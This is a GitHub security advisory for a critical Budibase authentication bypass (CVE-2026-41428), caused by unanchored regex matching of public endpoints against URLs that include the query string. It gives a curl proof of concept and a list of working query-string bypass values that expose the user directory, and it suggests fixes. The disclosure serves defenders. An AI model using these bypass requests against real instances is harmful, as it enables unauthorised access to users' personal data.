{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/100233436?v=4", "events_url": "https://api.github.com/users/AyushParkara/events{/privacy}", "followers_url": "https://api.github.com/users/AyushParkara/followers", "following_url": "https://api.github.com/users/AyushParkara/following{/other_user}", "gists_url": "https://api.github.com/users/AyushParkara/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/AyushParkara", "id": 100233436, "login": "AyushParkara", "node_id": "U_kgDOBflw3A", "organizations_url": "https://api.github.com/users/AyushParkara/orgs", "received_events_url": "https://api.github.com/users/AyushParkara/received_events", "repos_url": "https://api.github.com/users/AyushParkara/repos", "site_admin": false, "starred_url": "https://api.github.com/users/AyushParkara/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/AyushParkara/subscriptions", "type": "User", "url": "https://api.github.com/users/AyushParkara", "user_view_type": "public"}}], "cve_id": "CVE-2026-41428", "cvss": {"score": 9.1, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"}, "cvss_severities": {"cvss_v3": {"score": 9.1, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-287", "name": "Improper Authentication"}], "description": "### Summary

The `authenticated` middleware uses unanchored regular expressions to match public (no-auth) endpoint patterns against `ctx.request.url`. Since `ctx.request.url` in Koa includes the query string, an attacker can access any protected endpoint by appending a public endpoint path as a query parameter. For example, `POST /api/global/users/search?x=/api/system/status` bypasses all authentication because the regex `/api/system/status/` matches in the query string portion of the URL.

### Details

**Step 1 ŌĆö Public endpoint patterns compiled without anchors**

`packages/backend-core/src/middleware/matchers.ts`, line 26:

```typescript
return { regex: new RegExp(route), method, route }
```

No `^` prefix, no `$` suffix. The regex matches anywhere in the test string.

**Step 2 ŌĆö Regex tested against full URL including query string**

`packages/backend-core/src/middleware/matchers.ts`, line 32:

```typescript
const urlMatch = regex.test(ctx.request.url)
```

Koa's `ctx.request.url` returns the full URL including query string (e.g., `/api/global/users/search?x=/api/system/status`). The regex `/api/system/status` matches in the query string.

**Step 3 ŌĆö publicEndpoint flag set to true**

`packages/backend-core/src/middleware/authenticated.ts`, lines 123-125:

```typescript
const found = matches(ctx, noAuthOptions)
if (found) {
  publicEndpoint = true
}
```

**Step 4 ŌĆö Worker's global auth check skipped**

`packages/worker/src/api/index.ts`, lines 160-162:

```typescript
.use((ctx, next) => {
  if (ctx.publicEndpoint) {
    return next()        // ŌåÉ SKIPS the auth check below
  }
  if ((!ctx.isAuthenticated || ...) && !ctx.internal) {
    ctx.throw(403, "Unauthorized")   // ŌåÉ never reached
  }
})
```

When `ctx.publicEndpoint` is `true`, the 403 check at line 165-168 is never executed.

**Step 5 ŌĆö Routes without per-route auth middleware are exposed**

`loggedInRoutes` in `packages/worker/src/api/routes/endpointGroups/standard.ts` line 23:

```typescript
export const loggedInRoutes = endpointGroupList.group()   // no middleware
```

Endpoints on `loggedInRoutes` have NO secondary auth check. The global check at `index.ts:160-169` was their only protection.

**Affected endpoints (no per-route auth ŌĆö fully exposed):**
- `POST /api/global/users/search` ŌĆö search all users (emails, names, roles)
- `GET /api/global/self` ŌĆö get current user info
- `GET /api/global/users/accountholder` ŌĆö account holder lookup
- `GET /api/global/template/definitions` ŌĆö template definitions
- `POST /api/global/license/refresh` ŌĆö refresh license
- `POST /api/global/event/publish` ŌĆö publish events

**Not affected (have secondary per-route auth that blocks undefined user):**
- `GET /api/global/users` ŌĆö on `builderOrAdminRoutes` which checks `isAdmin(ctx.user)` ŌåÆ returns false for undefined ŌåÆ throws 403
- `DELETE /api/global/users/:id` ŌĆö on `adminRoutes` ŌåÆ same secondary check blocks it

### PoC

```bash
# Step 1: Confirm normal request is blocked
$ curl -s -o /dev/null -w "%{http_code}" \
    -X POST -H "Content-Type: application/json" -d '{}' \
    "https://budibase-instance/api/global/users/search"
403

# Step 2: Bypass auth via query string injection
$ curl -s -X POST -H "Content-Type: application/json" -d '{}' \
    "https://budibase-instance/api/global/users/search?x=/api/system/status"
{"data":[{"email":"admin@example.com","admin":{"global":true},...}],...}
```

Without auth ŌåÆ 403. With `?x=/api/system/status` ŌåÆ returns all users.

Any public endpoint pattern works as the bypass value:
- `?x=/api/system/status`
- `?x=/api/system/environment`
- `?x=/api/global/configs/public`
- `?x=/api/global/auth/default`

### Impact

An unauthenticated attacker can:
1. **Enumerate all users** ŌĆö emails, names, roles, admin status, builder status via `/api/global/users/search`
2. **Discover account holder** ŌĆö identify the instance owner via `/api/global/users/accountholder`
3. **Trigger license refresh** ŌĆö potentially disrupt service via `/api/global/license/refresh`
4. **Publish events** ŌĆö inject events into the event system via `/api/global/event/publish`

The user search is the most damaging ŌĆö it reveals the full user directory of the Budibase instance to anyone on the internet.

Note: endpoints on `builderOrAdminRoutes` and `adminRoutes` are NOT affected because they have secondary middleware (`workspaceBuilderOrAdmin`, `adminOnly`) that independently checks `ctx.user` and throws 403 when it's undefined. Only `loggedInRoutes` endpoints (which rely solely on the global auth check) are exposed.

### Suggested Fix

Two options (both should be applied):

**Option A ŌĆö Anchor the regex:**
```typescript
// matchers.ts line 26
return { regex: new RegExp('^' + route + '(\\?|$)'), method, route }
```

**Option B ŌĆö Use ctx.request.path instead of ctx.request.url:**
```typescript
// matchers.ts line 32
const urlMatch = regex.test(ctx.request.path)  // excludes query string
```", "epss": {"percentage": 0.00445, "percentile": 0.35525}, "ghsa_id": "GHSA-8783-3wgf-jggf", "github_reviewed_at": "2026-04-16T22:40:59Z", "html_url": "https://github.com/advisories/GHSA-8783-3wgf-jggf", "identifiers": [{"type": "GHSA", "value": "GHSA-8783-3wgf-jggf"}, {"type": "CVE", "value": "CVE-2026-41428"}], "nvd_published_at": "2026-04-24T20:16:27Z", "published_at": "2026-04-16T22:40:59Z", "references": ["https://github.com/Budibase/budibase/security/advisories/GHSA-8783-3wgf-jggf", "https://nvd.nist.gov/vuln/detail/CVE-2026-41428", "https://github.com/advisories/GHSA-8783-3wgf-jggf"], "repository_advisory_url": "https://api.github.com/repos/Budibase/budibase/security-advisories/GHSA-8783-3wgf-jggf", "severity": "critical", "source_code_location": "https://github.com/Budibase/budibase", "summary": "Budibase: Authentication Bypass via Unanchored Regex in Public Endpoint Matcher ŌĆö Unauthenticated Access to Protected Endpoints", "type": "reviewed", "updated_at": "2026-04-27T16:19:35Z", "url": "https://api.github.com/advisories/GHSA-8783-3wgf-jggf", "vulnerabilities": [{"first_patched_version": null, "package": {"ecosystem": "npm", "name": "@budibase/backend-core"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 3.35.3"}], "withdrawn_at": null}
title: Budibase: Authentication Bypass via Unanchored Regex in Public Endpoint Matcher ŌĆö Unauthenticated Access to Protected Endpoints
